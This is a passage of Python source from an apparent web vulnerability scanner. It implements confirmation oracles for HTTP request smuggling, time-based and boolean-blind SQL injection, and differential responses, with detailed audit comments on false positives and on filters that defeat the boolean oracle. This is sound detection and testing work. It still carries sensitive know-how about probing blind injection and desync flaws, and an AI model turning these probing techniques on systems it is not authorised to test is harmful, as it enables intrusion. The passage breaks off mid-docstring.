      dimensions          : subset of {status,length,lexical,structural,latency,marker}
                            (default: status,length,lexical,marker — ``latency`` must be
                            asked for EXPLICITLY; see the AUDIT R6 note below)
      length_threshold    : min fractional length change to count (default 0.05)
      lexical_threshold   : min 1-similarity to count (default 0.10)
      latency_threshold_ms: min added latency to count (default 1000)
      true_marker         : string that must appear in `mutated` but not baseline
      expect              : "differ" (default) or "same"
    """
    if isinstance(discriminator, str):
        disc: dict[str, Any] = {"dimensions": [discriminator]}
    else:
        disc = dict(discriminator or {})

    b = _normalize_response(baseline)
    m = _normalize_response(mutated)

    # AUDIT R6 — ``latency`` is NOT in the DEFAULT set. Its weight is 0.7, which is
    # EXACTLY the verifier's HIGH_CONFIDENCE floor, so every caller that omitted a
    # discriminator inherited a latency-ONLY confirm path: a single timing delta over
    # two otherwise identical responses minted a FACT. That is a TIMING claim, and the
    # engine has a dedicated statistically-sound oracle for it (``timing_oracle``:
    # paired samples, alpha, dose-response). The fix is to remove the dimension from
    # the DEFAULT rather than to shave its weight to 0.69 — a weight just under the
    # floor still lets latency push a marginal second dimension over the line through
    # the noisy-OR, and it would say "timing is weak evidence" when the honest
    # statement is "timing is not part of this oracle's default proof at all".
    # AUDIT (this slice) — that last sentence USED to read "callers that genuinely
    # mean timing (the A12 request-smuggling LEAD probe) still ask for it
    # EXPLICITLY". It is now STALE and is corrected rather than deleted, because the
    # change of reachability matters: this slice removed that caller, and the
    # verifier now PINS the discriminator per bug class from the AUTHORITY's table
    # rather than accepting a producer-supplied one. So ZERO callers on the scan path
    # can request ``latency``. The dimension remains implemented and reachable only
    # by a direct, in-process ``differential_oracle`` call that names it — it is not
    # dead code, but nothing in the shipped pipeline asks for it.
    wanted = set(disc.get("dimensions") or _DEFAULT_DIFFERENTIAL_DIMENSIONS)
    length_thr = float(disc.get("length_threshold", 0.05))
    lexical_thr = float(disc.get("lexical_threshold", 0.10))
    latency_thr = float(disc.get("latency_threshold_ms", 1000.0))
    structural_thr = float(disc.get("structural_threshold", 0.02))
    true_marker = disc.get("true_marker")

    dims: list[dict[str, Any]] = []

    if "status" in wanted and b.status is not None and m.status is not None:
        differs = b.status != m.status
        dims.append({"dim": "status", "differs": differs, "weight": 0.6 if differs else 0.0,
                     "detail": f"{b.status} -> {m.status}"})

    if "length" in wanted:
        lb, lm = len(b.body), len(m.body)
        ratio = abs(lb - lm) / max(lb, lm, 1)
        differs = ratio > length_thr
        dims.append({"dim": "length", "differs": differs,
                     "weight": min(1.0, ratio) if differs else 0.0,
                     "detail": f"{lb} vs {lm} bytes ({ratio:.2%})"})

    if "lexical" in wanted:
        sim = difflib.SequenceMatcher(None, b.body, m.body).ratio()
        diff = 1.0 - sim
        differs = diff > lexical_thr
        dims.append({"dim": "lexical", "differs": differs,
                     "weight": diff if differs else 0.0,
                     "detail": f"similarity {sim:.2%}"})

    if "structural" in wanted:
        # AST-level divergence: invariant to nonce/CSRF/timestamp noise, so a
        # page that merely reflects a per-request token does NOT read as a diff,
        # while an added record / DOM node does. Higher precision than lexical.
        score = structural_diff(b.body, m.body)
        differs = score > structural_thr
        dims.append({"dim": "structural", "differs": differs,
                     "weight": min(1.0, score) if differs else 0.0,
                     "detail": f"structural delta {score:.2%}"})

    if "latency" in wanted and b.latency_ms is not None and m.latency_ms is not None:
        delta = m.latency_ms - b.latency_ms
        differs = delta >= latency_thr
        dims.append({"dim": "latency", "differs": differs,
                     "weight": 0.7 if differs else 0.0,
                     "detail": f"+{delta:.0f} ms"})

    if "marker" in wanted and true_marker:
        present = true_marker in m.body and true_marker not in b.body
        dims.append({"dim": "marker", "differs": present,
                     "weight": 0.9 if present else 0.0,
                     "detail": f"true_marker {'present' if present else 'absent'}"})

    differing = [d for d in dims if d["differs"]]
    diff_conf = _noisy_or([d["weight"] for d in differing])

    expect = disc.get("expect", "differ")
    if expect == "same":
        fired = len(differing) == 0 and len(dims) > 0
        confidence = min(0.99, 1.0 - diff_conf) if fired else 0.0
        evidence = ("responses indistinguishable across "
                    + ", ".join(d["dim"] for d in dims)) if fired else (
            "responses diverge on " + ", ".join(d["dim"] for d in differing))
    else:
        fired = len(differing) > 0
        confidence = diff_conf if fired else 0.0
        evidence = ("responses diverge on "
                    + ", ".join(f"{d['dim']} ({d['detail']})" for d in differing)) if fired else (
            "responses indistinguishable")

    return OracleSignal(
        kind=OracleKind.DIFFERENTIAL_RESPONSE,
        fired=fired,
        confidence=confidence,
        evidence=evidence,
        observed={"dimensions": dims, "expect": expect},
    )


_SMUGGLING_MIN_CANARY_LEN = 12


_SMUGGLING_MIN_CANARY_ENTROPY = 2.5   # bits/char — a random alnum token clears ~4-6


_SMUGGLING_CANARY_RE = re.compile(r"^[A-Za-z0-9]{12,}$")


_SMUGGLING_MANGLED_STATUSES = frozenset({400, 405, 501, 502})


def _smuggling_signal(fired: bool, *, evidence: str, observed: dict, conf: float = 0.95,
                      conclusive: bool = False) -> OracleSignal:
    # Reuses the FROZEN DIFFERENTIAL_RESPONSE kind (already in _ALL_ORACLES) but is reached
    # ONLY via the verifier's `smuggling_desync` ctx key, which no benchmark/scan/engage
    # finding carries — so `make gate` stays byte-identical and oracle_version is untouched.
    # A fire is always decisive; a NON-fire is `conclusive` only for a channel-confirmed
    # negative (both legs answered, no canary leaked) — an undecidable / low-entropy /
    # no-channel non-fire is a LEAD/INCONCLUSIVE, never a CLEAN.
    return OracleSignal(kind=OracleKind.DIFFERENTIAL_RESPONSE, fired=fired,
                        confidence=(conf if fired else 0.0),
                        conclusive=(True if fired else conclusive),
                        evidence=evidence, observed=observed)


def _smuggling_leg(leg: Any) -> "dict | None":
    """Coerce one burst leg's retained record to ``{channel, status, reason, body}`` (pure).
    ``None`` when the leg is not a mapping (no observation to adjudicate)."""
    if not isinstance(leg, Mapping):
        return None
    status = leg.get("status")
    try:
        status = int(status) if status is not None else None
    except (TypeError, ValueError):
        status = None
    return {"channel": bool(leg.get("channel", False)), "status": status,
            "reason": _coerce_text(leg.get("reason")), "body": _coerce_text(leg.get("body"))}


def smuggling_desync_oracle(observed: Any) -> OracleSignal:
    """Fire when VIGIL's OWN second request on a connection whose first request carried a
    framing conflict is DETERMINISTICALLY CORRUPTED by a leftover smuggled prefix — proven by
    a UNIQUE per-probe canary echoed in the conflict leg's second response AND absent from an
    identical no-conflict control leg's second response. The re-verifiable, timing-free
    achieved-state proof of HTTP request smuggling (CWE-444). Pure + deterministic; never
    raises. See the module comment above for the full contract."""
    obs = observed if isinstance(observed, Mapping) else {}
    canary = _coerce_text(obs.get("canary")).strip()
    technique = _coerce_text(obs.get("technique")).strip() or "CL.TE"
    base = {"technique": technique, "canary_len": len(canary)}

    # 1. The canary must be a UNIQUE, high-entropy VIGIL token, or a substring match could be
    #    coincidental (a benign body containing the token). A weak/absent canary is a LEAD.
    if (len(canary) < _SMUGGLING_MIN_CANARY_LEN or not _SMUGGLING_CANARY_RE.match(canary)
            or _shannon_bits_per_char(canary) < _SMUGGLING_MIN_CANARY_ENTROPY):
        return _smuggling_signal(
            False, observed=base,
            evidence=(f"the per-probe canary must be a unique VIGIL token (>= {_SMUGGLING_MIN_CANARY_LEN} "
                      "alnum chars AND >= 2.5 bits/char) so a substring match cannot be coincidental — "
                      "cannot adjudicate a desync (LEAD)"))

    conflict = _smuggling_leg(obs.get("conflict"))
    control = _smuggling_leg(obs.get("control"))
    if conflict is None or control is None:
        return _smuggling_signal(
            False, observed=base,
            evidence="the conflict and/or the no-conflict control second-request record is missing — "
                     "no differential to adjudicate (inconclusive)")

    # 2. BOTH VIGIL-owned second requests must have established a channel — a leg that read no
    #    response examined nothing (INCONCLUSIVE, never a desync and never a CLEAN).
    if not conflict["channel"] or not control["channel"]:
        return _smuggling_signal(
            False, observed={**base, "conflict_channel": conflict["channel"],
                             "control_channel": control["channel"]},
            evidence="a burst leg established no channel (the second request read no response) — "
                     "cannot adjudicate the desync differential (inconclusive)")

    echo_conflict = canary in conflict["body"]
    echo_control = canary in control["body"]
    mangled = conflict["status"] in _SMUGGLING_MANGLED_STATUSES and conflict["status"] != control["status"]
    detail = {**base, "echo_in_conflict": echo_conflict, "echo_in_control": echo_control,
              "conflict_status": conflict["status"], "control_status": control["status"],
              "mangled_method_status": mangled}

    # 3. The canary echoing in the CONTROL leg (identical bytes, WELL-FORMED framing) means the
    #    endpoint reflects the canary into the second response regardless of the conflict — the
    #    echo is NOT attributable to a desync. REFUSE (LEAD), never mint.
    if echo_control:
        return _smuggling_signal(
            False, observed=detail,
            evidence="the unique canary also appears in the NO-CONFLICT control's second response — the "
                     "echo is not attributable to a framing desync (an endpoint reflecting it regardless) "
                     "(REFUSE)")

    # 4. No echo in the conflict leg's second response: the back-end did not leak the smuggled
    #    prefix — no desync on this technique/origin. Both channels answered ⇒ channel-confirmed
    #    negative (a benign / anti-smuggling front-end that normalises the conflict lands here).
    if not echo_conflict:
        return _smuggling_signal(
            False, conclusive=True, observed=detail,
            evidence=(f"the {technique} conflict burst's second response did NOT echo the unique canary "
                      "(and neither did the control) — the origin did not desync this technique; a plain "
                      f"mangled-method status ({conflict['status']}) alone does not mint; did not fire"))

    # 5. The unique canary leaked into VIGIL's OWN second request's response on the conflict
    #    socket but NOT on the identical well-formed control socket — the ONLY difference (the
    #    framing conflict) caused the back-end to treat the smuggled prefix as the start of the
    #    next request. An achieved desync.
    return _smuggling_signal(
        True, conf=0.95, observed=detail,
        evidence=(f"HTTP request smuggling ({technique}): a UNIQUE per-probe canary embedded in the smuggled "
                  "prefix of VIGIL's first (conflict) request was ECHOED in VIGIL's OWN second request's "
                  "response on that socket, yet is ABSENT from an identical no-conflict control second "
                  "response — the back-end treated the smuggled prefix as the start of the next request "
                  "(a desync), proven by the differential, not by timing"
                  + (f"; the second request's method was also mangled (status {conflict['status']})"
                     if mangled else "")))


def _normal_cdf(z: float) -> float:
    """Standard-normal CDF via erf (pure stdlib)."""
    return 0.5 * (1.0 + math.erf(z / math.sqrt(2.0)))


def _rank_average(values: Sequence[float]) -> tuple[list[float], list[int]]:
    """Average (fractional) ranks of ``values`` and the sizes of each tie group.

    Ties share the mean of the ranks they would occupy — the standard
    correction, so the Mann-Whitney statistic is exact under ties."""
    order = sorted(range(len(values)), key=lambda i: values[i])
    ranks = [0.0] * len(values)
    tie_sizes: list[int] = []
    i = 0
    n = len(values)
    while i < n:
        j = i
        while j + 1 < n and values[order[j + 1]] == values[order[i]]:
            j += 1
        avg = (i + j) / 2.0 + 1.0  # ranks are 1-based
        for k in range(i, j + 1):
            ranks[order[k]] = avg
        if j > i:
            tie_sizes.append(j - i + 1)
        i = j + 1
    return ranks, tie_sizes


def _mann_whitney(baseline: Sequence[float], treatment: Sequence[float]) -> tuple[float, float]:
    """One-sided Mann-Whitney U for H1: treatment stochastically GREATER than
    baseline. Returns (z, p_value) using the normal approximation with tie and
    continuity correction. p is the probability of a U this extreme under H0
    (no location shift). Small samples still get an honest — if conservative —
    normal-approximation p; there is no exact-distribution table here."""
    n1, n2 = len(baseline), len(treatment)
    if n1 == 0 or n2 == 0:
        return 0.0, 1.0
    ranks, tie_sizes = _rank_average(list(baseline) + list(treatment))
    r_treat = sum(ranks[n1:])
    u_treat = r_treat - n2 * (n2 + 1) / 2.0
    mu = n1 * n2 / 2.0
    n = n1 + n2
    tie_term = sum(t ** 3 - t for t in tie_sizes)
    var = (n1 * n2 / 12.0) * ((n + 1) - tie_term / (n * (n - 1))) if n > 1 else 0.0
    if var <= 0.0:
        # Zero variance: either everything tied (no signal) or perfectly
        # separated with n too small — treat as no usable statistic.
        return 0.0, 1.0
    sigma = math.sqrt(var)
    # continuity correction toward the null
    z = (u_treat - mu - 0.5) / sigma
    p = 1.0 - _normal_cdf(z)
    return z, p


def _hodges_lehmann(baseline: Sequence[float], treatment: Sequence[float]) -> float:
    """The Hodges-Lehmann estimator of the median shift (treatment - baseline):
    the median of all pairwise differences. A robust effect-size measure that
    resists outliers (one slow request cannot manufacture a shift)."""
    diffs = [t - b for t in treatment for b in baseline]
    return median(diffs) if diffs else 0.0


_TIMING_MAX_ALPHA = 0.01


def timing_oracle(
    baseline_samples: Any,
    treatment_samples: Any,
    *,
    injected_ms: float | None = None,
    alpha: float = 0.01,
    effect_floor_fraction: float = 0.5,
    absolute_floor_ms: float = 250.0,
    min_samples: int = 5,
    dose: Mapping[str, Any] | None = None,
) -> OracleSignal:
    """Confirm a time-based blind vulnerability with a real hypothesis test.

    A single averaged comparison or a fixed latency threshold (what sqlmap/Burp
    largely do) false-positives under jitter and false-negatives under load.
    This fires only when ALL of the following hold, which together are robust to
    both:

      1. **Rank-sum test.** A one-sided Mann-Whitney U rejects H0 (no shift) at
         ``alpha`` — the delay-injected requests are stochastically slower, by a
         distribution-free test that does not assume Gaussian latencies.
      2. **Effect-size floor.** The Hodges-Lehmann median shift is at least
         ``effect_floor_fraction`` of the injected delay (or ``absolute_floor_ms``
         when the delay is unknown) — a statistically-significant-but-tiny shift
         (network drift) is refused.
      3. **Dose-response (optional).** When ``dose`` supplies a second treatment
         at a different delay, the observed shift must scale with the injected
         delay (e.g. SLEEP(2) ~= 2x SLEEP(1)) — a constant offset cannot fake
         this. ``dose = {"low_ms": .., "low_samples": [..], "high_ms": .., "high_samples": [..]}``.

    Deterministic and pure: given the same samples it returns the same signal.

    RED-PEN B3b — MONOTONE RATCHET on the two firing knobs. ``alpha`` and
    ``injected_ms`` used to be read verbatim, and the ``framework.v2 verify`` path
    fed them straight out of an UNTRUSTED report's oracle context. Measured on
    samples ``[100..104]`` vs ``[105..109]`` (a 5 ms shift, i.e. ordinary jitter):
    defaults refused it ("median shift 5ms < floor 250ms"), but
    ``timing_injected_ms: 1.0`` drove the floor to 0 ms and CONFIRMED, and
    ``timing_alpha: 0.5`` accepted a p of 0.047 (and 0.028 on a bimodal set that
    cleared the 250 ms floor outright). Both are
    now clamped HERE, at the authority, so every caller is covered — including
    call sites this module does not own:

      * ``alpha`` is clamped to at most ``_TIMING_MAX_ALPHA`` — a caller may only
        make the test STRICTER, never more permissive;
      * ``injected_ms`` may only RAISE the effect floor
        (``floor = max(absolute_floor_ms, effect_floor_fraction * injected_ms)``),
        so a declared 5 s sleep still demands a ~2.5 s shift while a declared 1 ms
        one can no longer erase the 250 ms absolute floor.

    ``dose`` is NOT clamped, deliberately: it is DEMOTE-ONLY. ``fired`` requires
    ``dose_ok``, a malformed dose spec sets ``dose_ok=True``/``dose_conf=0.0``, and
    once ``alpha <= 0.01`` any fired signal already has ``p_conf = 0.9``, so
    ``dose_conf`` cannot lift a signal over a confirmation threshold it would not
    otherwise clear. A hostile dose can only REFUSE a fire; removing it would
    strictly WEAKEN this oracle. See ``test_timing_dose_is_demote_only``.
    """
    alpha = min(float(alpha), _TIMING_MAX_ALPHA)
    base = [float(x) for x in (baseline_samples or [])]
    treat = [float(x) for x in (treatment_samples or [])]
    if len(base) < min_samples or len(treat) < min_samples:
        return OracleSignal(
            kind=OracleKind.TIMING, fired=False, confidence=0.0,
            evidence=f"insufficient samples ({len(base)}/{len(treat)}, need >= {min_samples} each)",
            observed={"n_baseline": len(base), "n_treatment": len(treat)},
        )

    z, p = _mann_whitney(base, treat)
    shift = _hodges_lehmann(base, treat)
    # RED-PEN B3b: the declared injected delay may only RAISE the floor, never
    # lower it below the absolute floor (`injected_ms: 1.0` used to give floor 0).
    floor = (max(absolute_floor_ms, effect_floor_fraction * injected_ms)
             if injected_ms else absolute_floor_ms)

    reject = p < alpha
    effect_ok = shift >= floor

    dose_ok = True
    dose_detail = ""
    dose_conf = 0.0
    if dose is not None:
        low = [float(x) for x in (dose.get("low_samples") or [])]
        high = [float(x) for x in (dose.get("high_samples") or [])]
        low_ms = float(dose.get("low_ms", 0.0) or 0.0)
        high_ms = float(dose.get("high_ms", 0.0) or 0.0)
        if len(low) >= min_samples and len(high) >= min_samples and low_ms > 0 and high_ms > low_ms:
            low_shift = _hodges_lehmann(base, low)
            high_shift = _hodges_lehmann(base, high)
            expected_ratio = high_ms / low_ms
            observed_ratio = (high_shift / low_shift) if low_shift > 0 else 0.0
            # The observed shift must actually SCALE with the injected delay. A
            # constant offset (a slow proxy) gives ratio ~1.0 regardless; a real
            # dose gives ~expected_ratio. Require the ratio to sit above the
            # halfway point between "no scaling" (1) and full scaling, and not
            # wildly overshoot — so ratio 1.0 is refused, ratio ~expected passes.
            lower = 1.0 + 0.5 * (expected_ratio - 1.0)
            upper = 1.5 * expected_ratio
            dose_ok = lower <= observed_ratio <= upper
            dose_conf = 0.9 if dose_ok else 0.0
            dose_detail = f"; dose ratio {observed_ratio:.2f} vs expected {expected_ratio:.2f}"
        else:
            dose_ok = True  # malformed dose spec: do not penalise, just don't corroborate

    fired = reject and effect_ok and dose_ok

    if not fired:
        why = []
        if not reject:
            why.append(f"rank-sum p={p:.4g} >= alpha={alpha}")
        if not effect_ok:
            why.append(f"median shift {shift:.0f}ms < floor {floor:.0f}ms")
        if not dose_ok:
            why.append("dose-response failed")
        return OracleSignal(
            kind=OracleKind.TIMING, fired=False, confidence=0.0,
            # Channel-confirmed negative: this branch is past the min-samples guard, so a
            # real hypothesis test ran over adequate paired latencies and did not detect a
            # shift — a decisive "no timing channel" clean (the insufficient-samples early
            # return above stays non-conclusive → inconclusive, as it had no usable test).
            conclusive=True,
            evidence="no timing signal: " + "; ".join(why),
            observed={"z": z, "p_value": p, "median_shift_ms": shift, "floor_ms": floor},
        )

    p_conf = min(0.9, 1.0 - p)
    eff_conf = min(0.85, shift / injected_ms) if injected_ms else min(0.85, shift / (floor * 2))
    confidence = _noisy_or([p_conf, eff_conf, dose_conf])
    return OracleSignal(
        kind=OracleKind.TIMING,
        fired=True,
        confidence=confidence,
        evidence=(
            f"delay-injected requests are slower (Mann-Whitney z={z:.2f}, p={p:.3g}); "
            f"median shift {shift:.0f}ms >= floor {floor:.0f}ms{dose_detail}"
        ),
        observed={
            "z": z, "p_value": p, "median_shift_ms": shift, "floor_ms": floor,
            "n_baseline": len(base), "n_treatment": len(treat), "dose_ok": dose_ok,
        },
    )


def _sprt_decision(
    signals: Any,
    *,
    alpha: float,
    beta: float,
    p1: float,
    p0: float,
) -> tuple[str | None, float, int, int, float, float]:
    """The Wald SEQUENTIAL PROBABILITY RATIO TEST core, factored out so more than one oracle can
    share the SAME sequential test (``boolean_inference_oracle`` and ``credential_stuffing_oracle``).

    ``signals`` is an ITERABLE of bools consumed LAZILY: the loop stops pulling from the iterable
    at the first boundary, so a generator that computes each Bernoulli signal on demand does no
    work past the decision (this keeps ``boolean_inference_oracle`` byte-identical to its old
    inline loop — the same per-round work, in the same order, stopping at the same round).

    Returns ``(decided, llr, n_used, n_signal, upper, lower)`` where ``decided`` is ``"confirm"``
    (LLR >= log((1-beta)/alpha)), ``"refute"`` (LLR <= log(beta/(1-alpha))), or ``None`` (no
    boundary reached — inconclusive, a non-fire, never a guess). Pure + deterministic."""
    upper = math.log((1.0 - beta) / alpha)
    lower = math.log(beta / (1.0 - alpha))
    llr = 0.0
    n_used = 0
    n_signal = 0
    decided: str | None = None
    for sig in signals:
        n_used += 1
        n_signal += 1 if sig else 0
        llr += math.log(p1 / p0) if sig else math.log((1.0 - p1) / (1.0 - p0))
        if llr >= upper:
            decided = "confirm"
            break
        if llr <= lower:
            decided = "refute"
            break
    return decided, llr, n_used, n_signal, upper, lower


def _boolean_round_arm(r: Mapping[str, Any], key: str) -> list[Any]:
    """One truth-side arm of a boolean probe round as a list (``[]`` when absent/malformed).

    The round shape is ``{"trues": [...], "falses": [...], "true_repeats": [...],
    "false_repeats": [...]}`` — ``trues``/``falses`` are the responses to K DISTINCT,
    syntactically-VARIED clauses of one fixed truth value; ``*_repeats`` are their
    index-aligned BYTE-IDENTICAL repeats."""
    v = r.get(key)
    return list(v) if isinstance(v, (list, tuple)) else []


_BOOLEAN_DIMENSIONS = ("status", "length", "lexical", "structural")


_BOOLEAN_DEFAULT_DIMENSIONS = ("status", "length", "lexical")


def _boolean_discriminator(discriminator: Mapping[str, Any] | str | None) -> dict[str, Any]:
    """The effective discriminator for EVERY boolean comparison — fully protocol-pinned.

    Only the DIMENSIONS may be narrowed by a caller, and only within ``_BOOLEAN_DIMENSIONS``. The
    THRESHOLDS are pinned too (they are simply dropped): they set SENSITIVITY, and a threshold fitted to
    a particular set of retained bytes can manufacture "within-cluster same, across-cluster differ" out
    of noise — the same forgery the SPRT parameters allowed. No live caller passes thresholds (all three
    pass protocol constants), so pinning costs nothing and removes the seam entirely rather than leaving
    a comment claiming it is unreachable."""
    if isinstance(discriminator, str):
        disc: dict[str, Any] = {"dimensions": [discriminator]}
    else:
        disc = dict(discriminator or {})
    wanted = [d for d in (disc.get("dimensions") or _BOOLEAN_DEFAULT_DIMENSIONS)
              if d in _BOOLEAN_DIMENSIONS]
    return {"dimensions": wanted or list(_BOOLEAN_DEFAULT_DIMENSIONS), "expect": "differ"}


def _boolean_reflection_forms(clause: str) -> tuple[str, ...]:
    """Every encoding of ``clause`` that could appear reflected in a response body: the RAW clause,
    both HTML-escaped forms (quotes escaped and not), and both URL-encoded forms. Deduplicated and
    ordered LONGEST-first so a shorter encoding can never bite a substring of a longer one."""
    if not clause:
        return ()
    forms = {
        clause,
        html.escape(clause, quote=True),
        html.escape(clause, quote=False),
        _urlquote(clause, safe=""),
        _urlquote(clause),
    }
    return tuple(sorted((f for f in forms if f), key=len, reverse=True))


def _mask_boolean_reflection(resp: Any) -> Any:
    """Return ``resp`` with every occurrence of ITS OWN retained injected ``clause`` (raw /
    HTML-escaped / URL-encoded) stripped from the body. A response carrying no ``clause`` is returned
    UNCHANGED (an old context, or an arm that never reflected), so the behaviour on a non-reflecting
    target — and on every pre-existing retained context — is byte-for-byte what it was."""
    if not isinstance(resp, Mapping):
        return resp
    clause = resp.get("clause")
    if not clause:
        return resp
    body = _coerce_text(resp.get("body", resp.get("text", resp.get("content", ""))))
    for form in _boolean_reflection_forms(str(clause)):
        body = body.replace(form, "")
    out = dict(resp)
    out["body"] = body
    return out


def boolean_inference_oracle(
    probe_rounds: Any,
    *,
    alpha: float = 0.05,
    beta: float = 0.05,
    p1: float = 0.9,
    p0: float = 0.1,
    discriminator: Mapping[str, Any] | str | None = None,
    false_baseline_samples: Any = None,
    min_baseline_samples: int = 6,
    min_true_clauses: int = 4,
    min_false_clauses: int = 4,
) -> OracleSignal:
    """Confirm a boolean-blind vulnerability by a Wald SEQUENTIAL PROBABILITY RATIO TEST
    over repeated probes whose per-round signal is a TRUTH-VALUE ATTRIBUTION test.

    THE GUARANTEE (and the only one). A ``boolean_sqli`` FACT requires the response to be a
    deterministic FUNCTION OF THE INJECTED BOOLEAN'S TRUTH VALUE. It is NOT enough that the
    "true" request and the "false" request came back different: on a page whose body is drawn
    INDEPENDENTLY of the input (a rotating banner, an A/B bucket, a load-balanced pair of
    replicas) two draws differ by coincidence, and no amount of determinism *screening* removes
    that — a sample window that LOOKS deterministic still produces the coincidence inside it.
    This oracle therefore does not screen for determinism and then trust a single true/false
    pair; it demands that the response PARTITION BY TRUTH VALUE:

      * Each round carries ``K_T >= min_true_clauses`` responses to DISTINCT, syntactically
        VARIED clauses that are all logically TRUE (``trues``), and ``K_F >=
        min_false_clauses`` responses to DISTINCT, varied clauses that are all logically
        FALSE (``falses``) — plus an index-aligned BYTE-IDENTICAL repeat of each
        (``true_repeats`` / ``false_repeats``).
      * The round signals 1 only when ALL THREE hold:
          1. DETERMINISM       — every clause, sent twice byte-identically, does not differ
                                 (enforced globally as a HARD REFUTE, below).
          2. WITHIN-TRUTH      — every TRUE-side response agrees with every other TRUE-side
             AGREEMENT          response (ONE true cluster), and likewise for the FALSE side
                                 (``differential_response_oracle`` non-fire inside a cluster).
          3. ACROSS-TRUTH      — every TRUE-side response DIFFERS from every FALSE-side
             SEPARATION         response (the two clusters are disjoint).

    WHY AN INPUT-INDEPENDENT PAGE CANNOT PASS (the bound, and its exact scope). Say each
    response is an INDEPENDENT draw from an arbitrary variant distribution ``{p_v}`` — a
    rotating banner, an A/B bucket, two replicas behind a balancer. Then the ``2*K_T`` true-side
    and ``2*K_F`` false-side responses are ``2*(K_T+K_F)`` independent draws, and a clean
    2-cluster split by truth value needs every true-side draw to be the SAME variant ``a``,
    every false-side draw the same variant ``b``, and ``a != b``:

        s  =  SUM over a != b of  p_a**(2*K_T) * p_b**(2*K_F)   <=  2 * 2**-(2*K_T + 2*K_F)

    (maximised by a UNIFORM 2-variant page). At the ``K_T = K_F = 7`` the drivers ship that is
    ``s <= 2 * 2**-28 = 7.5e-9``; at the oracle's CONFIRM floor (``K_T = K_F = 4``) it is
    ``s <= 2 * 2**-16 = 3.1e-5``, still ~3300x below the SPRT's null rate ``p0 = 0.1``. With
    ``alpha = beta = 0.05, p1 = 0.9, p0 = 0.1`` the confirm boundary is two NET signalling
    rounds, so a gambler's-ruin bound puts the per-FINDING false-confirm probability at
    ``<= s**2 / (1 - 2s)`` — ``~5.6e-17`` at ``K = 7`` — and that bound holds with NO determinism
    pre-gate at all. The skew that defeated a 16-sample determinism pre-gate (a dominant variant
    ``p ~ 0.9`` passes ``0.9**16 ~ 19%`` of windows) makes this test STRICTER, not weaker.

    TWO THINGS THIS BOUND DOES NOT COVER. Both are real, both are demonstrated, and NEITHER is
    "impossible to observe" — an earlier revision of this docstring said so and was wrong:

      (a) A TRUTH-CORRELATED REQUEST FILTER — STATUS: OPEN. An interposer that partitions the
          probes by a property of the REQUEST that happens to track truth value, with no boolean
          channel behind it at all. The bound above says nothing about this, because it is a
          property of the CLAUSE SET, not of the page.

          WHY IT IS OPEN, STRUCTURALLY — this is the part to read, not the ladder. The oracle needs
          clauses whose truth value VIGIL knows A PRIORI: before the request is sent, without
          touching the target's database. A predicate knowable that way IS A CONSTANT EXPRESSION,
          and any constant expression the scanner can evaluate offline, a filter in front of a
          static page can also evaluate offline. So no clause set removes this residual; a clause
          set only raises the COMPLEXITY of the function the filter has to implement. Every
          mitigation in this area is therefore a TREADMILL, and the measured ladder below is that
          treadmill being climbed, one rung per revision.

          THE LADDER, all measured through the REAL mint path against a STATIC, NON-VULNERABLE page
          (no SQL anywhere, no boolean channel — every FACT is false by construction):

            literal-only set (`X = X` / `X = Y`)   vs CRS-942130 backreference regex   2000/2000
            shape-varied set                       vs the same CRS-942130 regex             0/2000
            shape-varied FOLDABLE subset (K=6)     vs a complete ~60-line CONSTANT FOLDER  200/200
            SHIPPED set (K=7, with `IN (SELECT)`)  vs that same folder                       0/200
            SHIPPED set                            vs that folder + a THREE-LINE `IN` rule  600/600
            SHIPPED set, literals randomised       vs folder + a NINE-STRING `IN` blocklist 300/300
            SHIPPED set                            vs an exact-string blocklist of its TRUEs 200/200
            SHIPPED set                            vs ANY filter blind to one shape           0 each

          Read the ladder as a whole. Each row that reaches 0 was called a fix; the next row is that
          fix being cleared by a filter one rule larger. The folder is ~60 lines and contains no SQL
          engine, no parser generator and no database; the `IN` rule that took the last 0 back to
          600/600 is three lines, because `LIT IN (SELECT LIT)` over a one-row constant select IS
          literal equality (sqlite3: `3 IN (SELECT 3)` -> 1, `3 IN (SELECT 5)` -> 0) — `X = X` vs
          `X = Y` in a costume, with the same separating surface feature. The randomised-literal row
          is the same lesson: the clause TEMPLATES are public in an open-source repo, so the filter
          derives its rules from them and only needs nine strings for the one randomised atom —
          which is why the literals are now a STABLE PUBLIC CONSTANT instead (correlatability and
          replayability are worth more than a mitigation that measures zero).

          PROVENANCE, so no row is taken for more than it is. Four rows are PINNED by live
          regressions that re-measure them every CI run at 10-20 trials each
          (``scanner/tests/test_boolean_inference_check.py``): CRS-942130 both halves, the complete
          folder, the folder blinded to one shape, and the exact-string blocklist. The 2000-,
          600- and 300-trial figures are one-off at-scale runs of those same cells, not CI cells.
          (The 300/300 row was 299/300 as the red-pen first measured it; the one miss was their
          folder's naive OR-split cutting inside a string literal that happened to contain "or" —
          a fixture artefact, and the fixture here masks literals before splitting.)

          WHAT THE CLAUSE SET DOES BUY, precisely and no more: a filter must be COMPLETE over the
          shape set to partition. Blind it to any ONE comparison shape and it blocks only part of
          the TRUE side, within-truth agreement breaks, and the round REFUTES — measured 0 for the
          CRS-942130 rule, for equality-only, lexicographic-only, numeric-direction-only,
          LIKE-prefix-only and generic block-any-OR/quote filters, and 0 in a LEAVE-ONE-SHAPE-OUT
          sweep for every one of the seven shipped shapes blinded. That is a real property and it
          is why the common real-world filter refutes. It is NOT sufficiency, and an earlier
          revision of this docstring that said the set was closed by a "SQL-EVALUATED" pair was
          wrong: the pair is a seventh comparison shape, no more.

          WHAT AN OPERATOR SHOULD CONCLUDE. A boolean_sqli FACT is sound against a page whose body
          varies independently of the input (the bound above) and against every INCOMPLETE
          request-side filter. It is NOT sound against a filter purpose-built to decide this clause
          set, and such a filter is cheap. Where that matters — a target known to sit behind an
          aggressive WAF, or a FACT whose whole weight rests on this one oracle — corroborate with a
          channel that does not live in the response bytes (an OOB/DNS callback, an error-signature
          or a timing arm), or treat it as a LEAD.

          RESIDUAL (a2) — STATUS: OPEN, and out of reach from the response side. An interposer that
          genuinely EVALUATES the injected expression (a WAF embedding a real SQL parser and
          evaluator) can partition the probes by truth value with no database behind it. That is the
          same shape of limit as (b) — such an interposer IS computing the truth function this
          oracle reads — and no clause set defeats it from the response side; it needs an
          out-of-band channel (OOB/DNS, a side effect) to separate. (a) is NOT a special case of
          (a2) and must not be filed under it: (a) needs no evaluator at all, only a folder.

          A caller supplying its own clause sets inherits the shape-diversity obligation and the
          same open residual; see ``scanner.checks.boolean_clause_families``.

      (b) A page that is a DETERMINISTIC but ARBITRARY function of the request — STATUS: OPEN,
          and BOUNDED rather than closed (a CDN caching per exact URL over an origin that picked a
          variant at fill time, a balancer pinning each URL to a replica). There the byte-identical
